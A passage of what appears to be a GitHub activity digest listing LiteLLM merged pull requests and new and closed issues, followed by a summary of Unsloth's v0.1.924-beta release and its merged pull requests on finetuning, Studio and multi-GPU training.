- [#53084](https://github.com/BerriAI/litellm/pull/53084) fix(files): keep plain provider uploads private to the uploading team
- [#48984](https://github.com/BerriAI/litellm/pull/48984) feat(elevenlabs): add scribe_v2_realtime realtime transcription
- [#54339](https://github.com/BerriAI/litellm/pull/54339) test(auth): open the rust database in the auth prefetch integration fixture
- [#54340](https://github.com/BerriAI/litellm/pull/54340) test(migrations): read the killed deploy's attempt clock before its session opens
- [#54042](https://github.com/BerriAI/litellm/pull/54042) feat(rust-gateway): reload the config stored in the DB on an interval and swap to it
- [#54334](https://github.com/BerriAI/litellm/pull/54334) test(s3-log): record output_cost_per_image_token_flex in the s3_v2 golden payloads
- [#49764](https://github.com/BerriAI/litellm/pull/49764) fix(router): count pre-call context-window tokens with each deployment's tokenizer
- [#54227](https://github.com/BerriAI/litellm/pull/54227) fix(messages): answer 400 for a non-string user or system text block and keep count_tokens in step with inference (lts/1.108.x)
- [#54022](https://github.com/BerriAI/litellm/pull/54022) feat(rust-gateway): hold config-built state in a swappable unit
- [#54322](https://github.com/BerriAI/litellm/pull/54322) fix(proxy): keep no-log request content out of spend logs when the ledger is off
- [#54034](https://github.com/BerriAI/litellm/pull/54034) feat(rust-gateway): boot from the config file plus the config stored in the DB
- [#54225](https://github.com/BerriAI/litellm/pull/54225) feat(huawei_maas): add Huawei Cloud MaaS provider and cost map rows
- [#54331](https://github.com/BerriAI/litellm/pull/54331) fix(gemini): bill flex image output tokens at the flex rate
- [#54307](https://github.com/BerriAI/litellm/pull/54307) fix(proxy): keep a temp budget increase on a team default member following the team default
- [#54023](https://github.com/BerriAI/litellm/pull/54023) feat(rust-config): merge DB models and credentials into the config model list
- [#54283](https://github.com/BerriAI/litellm/pull/54283) fix(router): count streamed responses against deployment TPM
- [#54298](https://github.com/BerriAI/litellm/pull/54298) feat(proxy): let a team count cached input tokens against its per-model TPM limit
- [#54021](https://github.com/BerriAI/litellm/pull/54021) feat(rust-config): layer LiteLLM_Config settings rows over the config document
- [#54025](https://github.com/BerriAI/litellm/pull/54025) feat(rust-config): add litellm-at-rest crate for salt-key encryption of DB values
- [#54191](https://github.com/BerriAI/litellm/pull/54191) fix(gemini): translate validated tool choice
- [#54020](https://github.com/BerriAI/litellm/pull/54020) feat(rust-config): add repositories for the config, model and credential tables
- [#54305](https://github.com/BerriAI/litellm/pull/54305) test(e2e): move the Claude Code matrix to Opus, Sonnet and Haiku 5.5, Fable 5.2 and GPT-6
- [#54321](https://github.com/BerriAI/litellm/pull/54321) refactor(types): give bare dict, list and tuple returns proven types in 133 files
- [#54084](https://github.com/BerriAI/litellm/pull/54084) fix(proxy): keep the prompt out of Langfuse model parameters for rejected requests
- [#53253](https://github.com/BerriAI/litellm/pull/53253) refactor(ui): remove unused financialFrameworkMeta and insultsFrameworkMeta
- [#53252](https://github.com/BerriAI/litellm/pull/53252) refactor(ui): remove unused DEFAULT_RANGE_HOURS and isLive
- [#53251](https://github.com/BerriAI/litellm/pull/53251) refactor(ui): remove unused RowTitle
- [#53250](https://github.com/BerriAI/litellm/pull/53250) refactor(ui): remove unused SESSION_ID_QUERY_PARAM
- [#53507](https://github.com/BerriAI/litellm/pull/53507) fix(guardrails): scan the system prompt and tool results in Bedrock during_call on /v1/messages
- [#53834](https://github.com/BerriAI/litellm/pull/53834) refactor(ui): remove five unused dashboard declarations
- [#54271](https://github.com/BerriAI/litellm/pull/54271) fix(router): preserve destination bearer credentials on Anthropic fallbacks
- [#54122](https://github.com/BerriAI/litellm/pull/54122) fix(proxy): log the prompt of a rejected responses, completions or embeddings request
- [#54196](https://github.com/BerriAI/litellm/pull/54196) build(rust): run rustls on aws-lc-rs everywhere and add a fips feature
- [#54317](https://github.com/BerriAI/litellm/pull/54317) fix(proxy): stop counting 404s on the removed /typesafe pass-through prefix as gateway requests
- [#54165](https://github.com/BerriAI/litellm/pull/54165) fix(messages): answer 400 for a non-string user or system text block and keep count_tokens in step with inference
- [#53864](https://github.com/BerriAI/litellm/pull/53864) fix(images): send JSON-form image edits upstream as JSON instead of a url-encoded form
- [#54314](https://github.com/BerriAI/litellm/pull/54314) chore: bump litellm-enterprise 0.1.88 -> 0.1.90, litellm-proxy-extras 0.4.120 -> 0.4.122, litellm 1.112.0 -> 1.113.0
- [#53249](https://github.com/BerriAI/litellm/pull/53249) refactor(ui): remove unused COLOR_BG_LIGHT, SPACING_SMALL and SPACING_XXLARGE
- [#53248](https://github.com/BerriAI/litellm/pull/53248) refactor(ui): remove unused isCodeInterpreterEvent
- [#53247](https://github.com/BerriAI/litellm/pull/53247) refactor(ui): remove unused AUTO_ROUTER_MODES
- [#53258](https://github.com/BerriAI/litellm/pull/53258) fix(guardrails): scan only new session text in Bedrock during_call
- [#54309](https://github.com/BerriAI/litellm/pull/54309) fix(proxy): track spend for no-log requests when the spend logs ledger is off
- [#49826](https://github.com/BerriAI/litellm/pull/49826) test(e2e): add a codex row that calls an mcp tool whose name is over 64 characters
- [#54300](https://github.com/BerriAI/litellm/pull/54300) test(router): pin the usage minute in the request scoped rpm check test
- [#54303](https://github.com/BerriAI/litellm/pull/54303) fix(cost): bill Responses image_generation tool images at the image deployment's configured rates
- [#54281](https://github.com/BerriAI/litellm/pull/54281) fix(caching): reuse async embedding entries in sync calls
- [#54026](https://github.com/BerriAI/litellm/pull/54026) fix(proxy): accept special-use email domains in generic SSO
- [#54290](https://github.com/BerriAI/litellm/pull/54290) fix(lint_config): check model_info and report settings a model needs
- [#52165](https://github.com/BerriAI/litellm/pull/52165) refactor(proxy)!: remove the TypeSafe pass-through route in favor of the unified decision endpoints
- [#54292](https://github.com/BerriAI/litellm/pull/54292) fix(auth): backport #51772 restricted end-user index to stable/1.109.x for v1.109.5
- [#54295](https://github.com/BerriAI/litellm/pull/54295) fix(proxy): keep a key with cache settings inside its own cache partition
- [#54302](https://github.com/BerriAI/litellm/pull/54302) fix(proxy): redact credential-named provider error fields that the name check skipped
- [#54284](https://github.com/BerriAI/litellm/pull/54284) fix(proxy-extras): roll back a migration killed at the deploy time limit
- [#54299](https://github.com/BerriAI/litellm/pull/54299) test(router): pin the usage minute in the usage refusal fallback tests
- [#54301](https://github.com/BerriAI/litellm/pull/54301) test(router): pin the usage minute in the group usage tests
- [#54277](https://github.com/BerriAI/litellm/pull/54277) feat(cost-map): add the Bedrock GovCloud Geo row for GPT-5.6 Cyber at its model card price
- [#53703](https://github.com/BerriAI/litellm/pull/53703) feat(gateway): tell callbacks who called, which deployment answered, when, and under what id
- [#54260](https://github.com/BerriAI/litellm/pull/54260) fix(cost-map): lower openai chat-latest max_input_tokens to the 272000 the API enforces
- [#54265](https://github.com/BerriAI/litellm/pull/54265) fix(cost-map): raise fireworks hy4-flash max_input_tokens to the 524288 the API enforces
- [#54289](https://github.com/BerriAI/litellm/pull/54289) fix(gemini): accept audio format wav for Gemini TTS chat completions
- [#54226](https://github.com/BerriAI/litellm/pull/54226) fix(terraform): preserve imported model routing on update
- [#54282](https://github.com/BerriAI/litellm/pull/54282) feat(proxy): include configured descriptions in Anthropic model lists
- [#39522](https://github.com/BerriAI/litellm/pull/39522) fix(speech)!: use the provider api key get_llm_provider resolves
- [#53452](https://github.com/BerriAI/litellm/pull/53452) perf(auth): read the auth prefetch owner rows through a rust repository
- [#54069](https://github.com/BerriAI/litellm/pull/54069) fix(auth): backport #51772 restricted end-user index to stable/1.110.x for v1.110.4
- [#54150](https://github.com/BerriAI/litellm/pull/54150) fix(ui): bump nginx to 1.31.10 and zlib to 1.4-r0
- [#54149](https://github.com/BerriAI/litellm/pull/54149) fix(ui): bump nginx to 1.31.10 and zlib to 1.4-r0
- [#54255](https://github.com/BerriAI/litellm/pull/54255) test(integration): backport main's test fixes to lts/1.108.x
- [#54219](https://github.com/BerriAI/litellm/pull/54219) feat(router)!: let a deployment choose which cache controls a request may override
- [#53269](https://github.com/BerriAI/litellm/pull/53269) fix(responses): one answer for which tool a bridged call is, read by the reply, tool permission and spend logs
- [#54270](https://github.com/BerriAI/litellm/pull/54270) fix(cache): honor request TTL when refreshing in-memory responses
- [#54158](https://github.com/BerriAI/litellm/pull/54158) fix(streaming): keep Azure prompt_filter_results and finish-chunk content_filter_results in chat streams on lts/1.108.x
- [#54268](https://github.com/BerriAI/litellm/pull/54268) refactor(types): give messages, tools and other repeated bare container parameters proven types in 64 files
- [#54241](https://github.com/BerriAI/litellm/pull/54241) ci: scan the stable line with OSV and grype after every merge [stable/1.109.x]
- [#54242](https://github.com/BerriAI/litellm/pull/54242) ci: scan the stable line with OSV and grype after every merge [stable/1.110.x]
- [#50840](https://github.com/BerriAI/litellm/pull/50840) fix(bedrock): discover models through the configured control-plane endpoint
- [#54243](https://github.com/BerriAI/litellm/pull/54243) fix(auth): backport #51772 restricted end-user index to rc/1.111.0
- [#54257](https://github.com/BerriAI/litellm/pull/54257) test(rate-limit): wait for the Rust limiter's queued log lines before comparing them
- [#53290](https://github.com/BerriAI/litellm/pull/53290) fix(guardrails): keep /v1/messages tools the guardrail left unchanged exactly as sent
- [#54252](https://github.com/BerriAI/litellm/pull/54252) test(groq): tell cost lookups the Whisper row changed in the catalog rate test
- [#54251](https://github.com/BerriAI/litellm/pull/54251) fix(realtime): stop importing the proxy when the SDK loads the realtime turn limits
- [#52806](https://github.com/BerriAI/litellm/pull/52806) fix(proxy): write a cold spend counter's cached spend once
- [#54246](https://github.com/BerriAI/litellm/pull/54246) test(e2e): move Vertex Claude Code cells from Sonnet 4.5 to Sonnet 4.6
- [#54236](https://github.com/BerriAI/litellm/pull/54236) fix(pass-through): bill generic Bedrock Mantle Messages routes at the Mantle price
- [#54209](https://github.com/BerriAI/litellm/pull/54209) fix(router): preserve IAM auth on Anthropic to Bedrock fallbacks
- [#54208](https://github.com/BerriAI/litellm/pull/54208) fix(router): preserve provider PDF preflight compatibility
- [#54232](https://github.com/BerriAI/litellm/pull/54232) fix(responses): backport access_programs on chat completions on OpenAI SDK 3 to lts/1.108.x
- [#54223](https://github.com/BerriAI/litellm/pull/54223) test(rust): update rust-wheel messages tests to main's current behaviour
- [#54237](https://github.com/BerriAI/litellm/pull/54237) feat(cost-map): add Fireworks Qwen4 Max and Hy4 Flash serverless rows
- [#51814](https://github.com/BerriAI/litellm/pull/51814) fix(responses): keep access_programs on chat completions on OpenAI SDK 3
- [#54161](https://github.com/BerriAI/litellm/pull/54161) fix(logging): log Anthropic base64 sources on /v1/messages and pass-through routes as a size placeholder
- [#54195](https://github.com/BerriAI/litellm/pull/54195) chore: bump litellm to 1.108.17 on lts/1.108.x
- [#54218](https://github.com/BerriAI/litellm/pull/54218) ci: scan the lts line with OSV and grype after every merge [lts/1.108.x]
- [#54228](https://github.com/BerriAI/litellm/pull/54228) test(auth): register the provider OAuth params and token cache in the credential and Redis producer guard tests
- [#53881](https://github.com/BerriAI/litellm/pull/53881) fix(passthrough): bill OpenAI Agents API turns from the session's turn usage on lts/1.108.x (#51237)
- [#54217](https://github.com/BerriAI/litellm/pull/54217) fix(proxy): return cache keys on non-streaming Anthropic cache hits
- [#51237](https://github.com/BerriAI/litellm/pull/51237) fix(passthrough): bill OpenAI Agents API turns from the session's turn usage
- [#54224](https://github.com/BerriAI/litellm/pull/54224) test(integration): bound burst rejection time by a factor of the control so a loaded runner cannot fail it
- [#54070](https://github.com/BerriAI/litellm/pull/54070) fix(auth): backport #51772 restricted end-user index to lts/1.108.x
- [#50932](https://github.com/BerriAI/litellm/pull/50932) fix(streaming): keep Azure prompt_filter_results and finish-chunk content_filter_results in chat streams
- [#54212](https://github.com/BerriAI/litellm/pull/54212) feat(terraform): add optional private ingress to AWS and GCP modules
- [#53061](https://github.com/BerriAI/litellm/pull/53061) feat(gateway): enforce a deployment's declared rate limits natively
- [#53039](https://github.com/BerriAI/litellm/pull/53039) feat(gateway): keep Messages requests native under enable_pre_call_checks
- [#54001](https://github.com/BerriAI/litellm/pull/54001) refactor(router-core): move reported_failure onto Core
- [#54000](https://github.com/BerriAI/litellm/pull/54000) refactor(router): type optional_pre_call_checks as an enum
- [#53999](https://github.com/BerriAI/litellm/pull/53999) fix(gateway): count Anthropic cache tokens in a response's total
- [#52923](https://github.com/BerriAI/litellm/pull/52923) fix(auth): report unreadable team rows as 503 and open the rust db in the spend logs parity test
- [#54041](https://github.com/BerriAI/litellm/pull/54041) feat(cache): apply scoped settings to exact-match response caching
- [#54101](https://github.com/BerriAI/litellm/pull/54101) feat(auth): support OAuth client credentials for inference providers
- [#50130](https://github.com/BerriAI/litellm/pull/50130) feat(proxy): sync LDAP groups to team memberships
- [#54203](https://github.com/BerriAI/litellm/pull/54203) refactor(types): give untyped kwargs and args parameters proven types in 36 files
- [#54091](https://github.com/BerriAI/litellm/pull/54091) perf(mcp): batch OAuth client reads for config servers
- [#54210](https://github.com/BerriAI/litellm/pull/54210) test(spend): read the streamed Vertex image as its completed event
- [#54206](https://github.com/BerriAI/litellm/pull/54206) test(e2e): expect the Models refresh action on the tab row again (rc/1.112.0)
- [#54205](https://github.com/BerriAI/litellm/pull/54205) test(e2e): expect the Models refresh action on the tab row again
- [#54207](https://github.com/BerriAI/litellm/pull/54207) fix(ui): move the UI image to nginx 1.31.10 and zlib 1.4 [lts/1.108.x]
- [#54167](https://github.com/BerriAI/litellm/pull/54167) fix(anthropic): a non-string advisor block id no longer answers 500
- [#54197](https://github.com/BerriAI/litellm/pull/54197) fix(prometheus): fill custom metadata labels on fallback metrics
- [#54056](https://github.com/BerriAI/litellm/pull/54056) feat(control_plane): fleet-wide team budgets via desired state and reconciliation
- [#54202](https://github.com/BerriAI/litellm/pull/54202) test(chatgpt): expect the provider code relayed on a streamed top-level rate limit
- [#54199](https://github.com/BerriAI/litellm/pull/54199) feat(cost-map): add the four OpenAI Healthcare model configurations at their pricing page rates
- [#54200](https://github.com/BerriAI/litellm/pull/54200) test(scim): key the roster repair test's cached user with AuthObject.user
- [#54193](https://github.com/BerriAI/litellm/pull/54193) fix(gemini): return raw pcm16 when Gemini TTS answers WAV audio on lts/1.108.x
- [#54184](https://github.com/BerriAI/litellm/pull/54184) fix(cost-map): add the 2027-03-06 retirement date Azure states for azure_ai/deepseek-v4.1-flash-1017
- [#54166](https://github.com/BerriAI/litellm/pull/54166) fix(gateway): map usage like the Python proxy in the Rust chat completions transforms
- [#54178](https://github.com/BerriAI/litellm/pull/54178) docs(proxy): drop stale auth note from the /get/ui_settings docstring
- [#53830](https://github.com/BerriAI/litellm/pull/53830) fix(ollama): send model-info lookups to the call's api_base with its key and retry failed ones
- [#51145](https://github.com/BerriAI/litellm/pull/51145) fix(gemini): return raw pcm16 when Gemini TTS answers WAV audio
- [#54027](https://github.com/BerriAI/litellm/pull/54027) feat(proxy): give AI API service accounts safe default routes only
- [#54192](https://github.com/BerriAI/litellm/pull/54192) refactor(types): give bare dict data and request_data parameters proven types in 72 files
- [#53925](https://github.com/BerriAI/litellm/pull/53925) fix(spend): record a failed delivery batch in one update
- [#53919](https://github.com/BerriAI/litellm/pull/53919) test(perf): raise the idle worker RSS budget
- [#54088](https://github.com/BerriAI/litellm/pull/54088) fix(proxy): keep token rate-limit reservations for embeddings the provider reports as 0 tokens

#### 🐛 New Issues
- [#54170](https://github.com/BerriAI/litellm/issues/54170) [Bug]: v3 rate limiter: TPM reservation subtracted twice when a request fails once and then succeeds (retry / order failover / fallback) 💬2
- [#54113](https://github.com/BerriAI/litellm/issues/54113) [Bug]: /v1/messages non-streaming returns empty content for openai/ provider models (streaming and /v1/chat/completions work) `llm translation` 💬2
- [#54315](https://github.com/BerriAI/litellm/issues/54315) [Bug]: JSONDecodeError in litellm/llms/ollama/chat/transformation.py `bug` `llm translation` 💬1
- [#54306](https://github.com/BerriAI/litellm/issues/54306) [Perf]: streaming with include_usage runs stream_chunk_builder twice per stream in _finalize_completed_stream `llm translation` 💬1
- [#54172](https://github.com/BerriAI/litellm/issues/54172) [Bug]: Bedrock Converse – process-global bedrock_tool_name_mappings rewrites tool names across requests and API keys `llm translation` `claude code` 💬1
- [#54130](https://github.com/BerriAI/litellm/issues/54130) [Bug]: Bedrock Mantle Messages passthrough records anthropic provider and zero spend for a priced model `llm translation` 💬1
- [#54177](https://github.com/BerriAI/litellm/issues/54177) [Bug]: AsyncHTTPHandler.post drops files on its ConnectError resend, multipart requests go out as x-www-form-urlencoded `llm translation` 💬1
- [#54135](https://github.com/BerriAI/litellm/issues/54135) [Bug]: team member permissions offered by /team/permissions_list break /key/generate and /key/update with 'is not a valid KeyManagementRoutes' 💬1
- [#54297](https://github.com/BerriAI/litellm/issues/54297) [Feature]: Support `model_max_budget` in default internal user settings (`DefaultInternalUserParams`)
- [#54259](https://github.com/BerriAI/litellm/issues/54259) [Feature]: Return `model_info.description` on the Anthropic-format `/v1/models` listing `llm translation` `claude code`
- [#54288](https://github.com/BerriAI/litellm/issues/54288) [Bug]: Rust gateway sends an oidc/ api_key reference to the provider as literal text `bug` `llm translation`
- [#54286](https://github.com/BerriAI/litellm/issues/54286) [Bug]: ValidationError in litellm/proxy/middleware/prometheus_auth_middleware.py `bug` `llm translation`
- [#54272](https://github.com/BerriAI/litellm/issues/54272) [Bug]: datadog_llm_observability leaks a DataDogLLMObsLogger (and its periodic_flush task) on every DB config reload
- [#54269](https://github.com/BerriAI/litellm/issues/54269) [Feature]: Expose custom callback latency by hook in Prometheus
- [#54141](https://github.com/BerriAI/litellm/issues/54141) [Bug]: deployment rpm is never enforced for image generation or image edit calls (simple-shuffle) `llm translation`
- [#54245](https://github.com/BerriAI/litellm/issues/54245) [Bug]: Draining a synchronous stream after usage overwrites the cached response `llm translation`
- [#54233](https://github.com/BerriAI/litellm/issues/54233) [Bug]: Anthropic streaming builds a redundant Delta for signed thinking blocks `llm translation`
- [#54160](https://github.com/BerriAI/litellm/issues/54160) [Bug]: Order fallback turns a 400 into 'No deployments available' (429) when another team has the next order level `llm translation`
- [#54115](https://github.com/BerriAI/litellm/issues/54115) [Bug]: Duplicate Content-Type header and malformed json body in Connection Test curl snippet `llm translation`

#### 🔒 Closed Issues
- [#37459](https://github.com/BerriAI/litellm/issues/37459) [Feature]: Native NeuralTrust TrustGuard guardrail
- [#12448](https://github.com/BerriAI/litellm/issues/12448) [Feature]: Support salt rotating
- [#52061](https://github.com/BerriAI/litellm/issues/52061) [Feature]: Configure response caching per model endpoint
- [#40888](https://github.com/BerriAI/litellm/issues/40888) [Feature]: OpenAI-compatible GPT-Live API support in LiteLLM Proxy
- [#47062](https://github.com/BerriAI/litellm/issues/47062) [Bug]: Cold end-user spend counter is incremented by the full balance and blocks a user under budget
- [#29818](https://github.com/BerriAI/litellm/issues/29818) [Bug]: OpenAI Codex CLI does not work with LiteLLM
- [#37258](https://github.com/BerriAI/litellm/issues/37258) [Bug]: PUT /v1/mcp/server silently nulls authorization_url, token_url, oauth2_flow when delegate_auth_to_upstream=true
- [#42085](https://github.com/BerriAI/litellm/issues/42085) [Feature/Bug]: Add opt-in strict stream validation (strict_stream_completion) to catch truncated SSE streams
- [#40651](https://github.com/BerriAI/litellm/issues/40651) [Bug]: lite codex silently bypasses the proxy when -c is passed after a Codex subcommand (exec/resume/review)
- [#52585](https://github.com/BerriAI/litellm/issues/52585) [Bug]: Non-streaming POST /v1/messages omits x-litellm-cache-key on response-cache hits
- [#37041](https://github.com/BerriAI/litellm/issues/37041) [Bug]: Ollama: get_runtime_model_info ignores the request's api_base and falls back to localhost:11434, adding ~8s of silent connect timeouts per completion
- [#35272](https://github.com/BerriAI/litellm/issues/35272) Feature request: health-aware multi-backend routing for Anthropic models
- [#41610](https://github.com/BerriAI/litellm/issues/41610) [Bug]: enforce_model_rate_limits — deployment TPM is never enforced for streaming requests (hidden_params.litellm_model_name is None)
- [#53737](https://github.com/BerriAI/litellm/issues/53737) [Bug]: Responses image_generation tool's image ignores the deployment's custom pricing
- [#36373](https://github.com/BerriAI/litellm/issues/36373) [Bug]: Troubles in terms that name of group of models cann't be used via model alias to request to entire group
- [#37344](https://github.com/BerriAI/litellm/issues/37344) Claude Code Max subscription: all proxied requests return 429 rate_limit_error while direct requests succeed
- [#37401](https://github.com/BerriAI/litellm/issues/37401) [Bug]: truncated error messages
- [#37430](https://github.com/BerriAI/litellm/issues/37430) [Bug]: Langfuse logs `output: null` for Responses API custom (freeform) tool calls
- [#44540](https://github.com/BerriAI/litellm/issues/44540) [Bug]: Gemini TTS on chat completions rejects audio.format "wav", though gemini-3.8 TTS models return WAV
- [#46107](https://github.com/BerriAI/litellm/issues/46107) [Bug]: per-page PDF token count (#45301) uses Anthropic pricing for every provider, so Router pre-call checks reject Gemini/OpenAI PDF requests the provider accepts
- [#44541](https://github.com/BerriAI/litellm/issues/44541) [Bug]: /v1/audio/speech returns a double WAV header for gemini-3.8 TTS models
- [#50390](https://github.com/BerriAI/litellm/issues/50390) [Bug]: safeguards classifier always fails with "'tuple' object does not support item assignment" when the classifier model has message-level cache_control_injection_points
- [#50788](https://github.com/BerriAI/litellm/issues/50788) [Bug]: Custom guardrail dotted path that names an instance is skipped at startup
- [#53809](https://github.com/BerriAI/litellm/issues/53809) Bug: image edit `markup` file is sent to OpenAI as text (its repr), so every markup-guided edit is rejected
- [#53492](https://github.com/BerriAI/litellm/issues/53492) [Feature]: ElevenLabs Scribe v2 Realtime (scribe_v2_realtime) on /v1/realtime
- [#37434](https://github.com/BerriAI/litellm/issues/37434) [Bug]: inflation/drift in /tag/daily/activity for custom-header tag metrics
- [#37472](https://github.com/BerriAI/litellm/issues/37472) [Feature]: user_alias parameter for /team/list
- [#37499](https://github.com/BerriAI/litellm/issues/37499) [Bug]: OAuth discovery can hang on a Streamable HTTP MCP GET response
- [#37531](https://github.com/BerriAI/litellm/issues/37531) [Bug]: Routing Issues
- [#53018](https://github.com/BerriAI/litellm/issues/53018) [Bug]: Cold virtual-key spend counter doubles to 2x when the DB reseed fails under concurrency
- [#49253](https://github.com/BerriAI/litellm/issues/49253) Anthropic messages guardrail translation drops tool fields
- [#50055](https://github.com/BerriAI/litellm/issues/50055) [Bug]: /v1/messages guardrail tool write-back drops web_search server tools and turns mcp_toolset into litellm_unnamed_tool_0
- [#54130](https://github.com/BerriAI/litellm/issues/54130) [Bug]: Bedrock Mantle Messages passthrough records anthropic provider and zero spend for a priced model
- [#45309](https://github.com/BerriAI/litellm/issues/45309) [Bug]: Router fallback to bedrock/ (and bedrock_mantle/) sends the caller's forwarded API key to AWS instead of SigV4-signing (follow-up to #14371)
- [#50826](https://github.com/BerriAI/litellm/issues/50826) [Bug]: Ollama model-info lookup ignores explicit api_base and uses OLLAMA_API_BASE
- [#45336](https://github.com/BerriAI/litellm/issues/45336) [Bug]: Oversized tool names drop healthy tool-usage records during PostgreSQL flush
- [#49629](https://github.com/BerriAI/litellm/issues/49629) [Bug]: MCP catalog reloads every server row on every MCP request until an MCP server is first edited
- [#44834](https://github.com/BerriAI/litellm/issues/44834) [Bug]: websearch_interception follow-up on /v1/messages ignores client max_tokens, hardcoded 1024 cap
- [#52518](https://github.com/BerriAI/litellm/issues/52518) [Feature]: Nace NDI document parsing as an OCR provider (nace/parse-low, nace/parse-medium, nace/parse-high)
- [#53707](https://github.com/BerriAI/litellm/issues/53707) Bug: JSON image edits (images: [{image_url}]) are sent to OpenAI as x-www-form-urlencoded and rejected
- [#53723](https://github.com/BerriAI/litellm/issues/53723) [Bug]: Sync embedding() raises "Invalid response object" on an entry cached by aembedding()
- [#54259](https://github.com/BerriAI/litellm/issues/54259) [Feature]: Return `model_info.description` on the Anthropic-format `/v1/models` listing
- [#53727](https://github.com/BerriAI/litellm/issues/53727) [Bug]: Per-request cache ttl is ignored when refreshing an entry in the in-memory cache
- [#52029](https://github.com/BerriAI/litellm/issues/52029) [Bug]: custom_prometheus_metadata_labels are always None on the fallback metrics
- [#54160](https://github.com/BerriAI/litellm/issues/54160) [Bug]: Order fallback turns a 400 into 'No deployments available' (429) when another team has the next order level

### Unsloth (`unslothai/unsloth`)

**Stars:** 80,200 · **Open issues:** 591 · **Last push:** <1h ago

On November 25, 2026, Unsloth released v0.1.924-beta, introducing significant enhancements for Inkling finetuning, allowing users to fine-tune models 1.8 to 3.1 times faster while utilizing 50% less VRAM and enabling exports to GGUF or merged 16-bit models. Among the key merged pull requests, the addition of a Files menu in the Studio chat and configuration options for local FastFlowLM runtimes stand out, alongside improvements in model training efficiency and debugging. Notably, a critical new bug issue was reported (#19275) regarding VRAM out-of-memory errors with the Inkling 2 Mini, highlighting ongoing challenges in resource management.

#### 🚀 New Releases
- [v0.1.924-beta](https://github.com/unslothai/unsloth/releases/tag/v0.1.924-beta) Inkling finetuning + perf fixes

#### ✅ Merged PRs
- [#19172](https://github.com/unslothai/unsloth/pull/19172) Studio: add a Files menu to chat
- [#19401](https://github.com/unslothai/unsloth/pull/19401) Studio: allow configuring local FastFlowLM runtimes
- [#19381](https://github.com/unslothai/unsloth/pull/19381) Studio: read Hub safetensors shard headers concurrently for component sizes
- [#19382](https://github.com/unslothai/unsloth/pull/19382) Studio: prebuild LTX-2.5's fused VAE kernels at video load
- [#19400](https://github.com/unslothai/unsloth/pull/19400) FSDP2 native: check for expert parallel without importing _utils
- [#19398](https://github.com/unslothai/unsloth/pull/19398) Tests: extract what get_model_name reads in the bad-mappings harness
- [#19394](https://github.com/unslothai/unsloth/pull/19394) Studio tests: fix two backend tests red on main (HIP label in the MIOpen stack, installer stub)
- [#19393](https://github.com/unslothai/unsloth/pull/19393) Expert parallel resume: read rank state with weights_only, like tensor parallel
- [#19325](https://github.com/unslothai/unsloth/pull/19325) Studio export: name the converter's error when a GGUF LoRA export fails, with a plain message for MoE expert adapters
- [#19337](https://github.com/unslothai/unsloth/pull/19337) Inkling 2 merged export: work with PEFT 0.18
- [#19386](https://github.com/unslothai/unsloth/pull/19386) Tests: run the expert parallel MoE family suite without Inkling 2 in transformers
- [#19331](https://github.com/unslothai/unsloth/pull/19331) Studio chat: show Inkling 2 reasoning as reasoning on the transformers path, and drop its message markup
- [#19338](https://github.com/unslothai/unsloth/pull/19338) Tensor parallel LoRA: round the low-rank product like the one-GPU compiled forward
- [#19347](https://github.com/unslothai/unsloth/pull/19347) Parallel preflight: multi-stage PP x DP under any dp name, competing tp_plan, V-schedule eval, NCCL check
- [#19267](https://github.com/unslothai/unsloth/pull/19267) Fix vLLM 0.26 CUDA worker startup on WSL2
- [#19322](https://github.com/unslothai/unsloth/pull/19322) Studio chat: stop transformers 5.24 replies from dying at the first newline
- [#19374](https://github.com/unslothai/unsloth/pull/19374) Studio: install a scanned PyPI transformers release without the dialog
- [#19277](https://github.com/unslothai/unsloth/pull/19277) Expert parallel for MoE training (UNSLOTH_PARALLEL="ep=N")
- [#19328](https://github.com/unslothai/unsloth/pull/19328) Studio: name every GPU in the run preview, and open Export on the finished run
- [#19335](https://github.com/unslothai/unsloth/pull/19335) Studio: train Inkling 2 in 4-bit on the latest-transformers sidecar and mask completions with its role tokens
- [#19326](https://github.com/unslothai/unsloth/pull/19326) Inkling 2: plan the multi-GPU split from the resolved config, and raise the out-of-memory a weight conversion hides
- [#19380](https://github.com/unslothai/unsloth/pull/19380) Tests: bind the INT8 attention verdict stub to the real signature
- [#19336](https://github.com/unslothai/unsloth/pull/19336) Studio video: refuse CPU-only video loads that do not fit host RAM before downloading
- [#19330](https://github.com/unslothai/unsloth/pull/19330) Studio LTX-2.5: stream the text connectors under group offload (5.6 GiB lower floor, more DiT blocks resident)
- [#19350](https://github.com/unslothai/unsloth/pull/19350) GRPO: int vLLM sleep level, refuse config-only context parallel without its wrapper
- [#19345](https://github.com/unslothai/unsloth/pull/19345) Cast the cached NF4 dense weight to out.dtype in the in-place addmm
- [#19334](https://github.com/unslothai/unsloth/pull/19334) GRPO: score the completion EOS in old / ref logps when pad == eos
- [#19379](https://github.com/unslothai/unsloth/pull/19379) Tests: skip the Inkling 2 save tests on transformers without Inkling 2
- [#19313](https://github.com/unslothai/unsloth/pull/19313) Inkling-2-Mini: load the pre-quantized unsloth/Inkling-2-Mini-unsloth-bnb-4bit for 4-bit loads
- [#19318](https://github.com/unslothai/unsloth/pull/19318) Keep optimizer steps per epoch when packing is on by default
- [#19353](https://github.com/unslothai/unsloth/pull/19353) Studio: ship a measured MIOpen db for the Wan VAE on Windows gfx1151
- [#19311](https://github.com/unslothai/unsloth/pull/19311) Studio video: size the Wan 2-card VAE split's tiles to the partner's free memory when the stock tiles do not fit (2x T4 decode -29%)
- [#19333](https://github.com/unslothai/unsloth/pull/19333) Studio diffusion training: W8A8 is the int8 base by default (Qwen-Image-2.1 L4 1.25 -> 0.57 s/step), no mid-run recompile on 8-aligned captions
- [#19329](https://github.com/unslothai/unsloth/pull/19329) Studio LTX-2.5: price the tiled VAE decode from the request's tile (8 GB cards render instead of refusing)
- [#19339](https://github.com/unslothai/unsloth/pull/19339) Block CUDA graphs auto: turn on at a launch/GPU ratio of 1.0 on sm80+ so A100 4B QLoRA stops landing at two speeds
- [#19297](https://github.com/unslothai/unsloth/pull/19297) Studio LTX-2.5: low-RAM route on fp16-only GPUs (renders on a T4 high-RAM host instead of refusing)
- [#19308](https://github.com/unslothai/unsloth/pull/19308) Studio diffusion: run the int8 CUTLASS race after the first image, and persist the GEMM probe verdict (fresh install first image -22% to -28%)
- [#19344](https://github.com/unslothai/unsloth/pull/19344) Studio MiniMax-H3 video: Auto INT8 attention with a 4-step exact start on every card (restores the Ada speedup, L4 denoise -19.4%)
- [#19351](https://github.com/unslothai/unsloth/pull/19351) Tests: bind the sampling defaults route stub to the real extra-slot router
- [#19319](https://github.com/unslothai/unsloth/pull/19319) Studio INT8 attention: compile the Triton kernel on NVIDIA Triton 3.3 (torch 2.7)
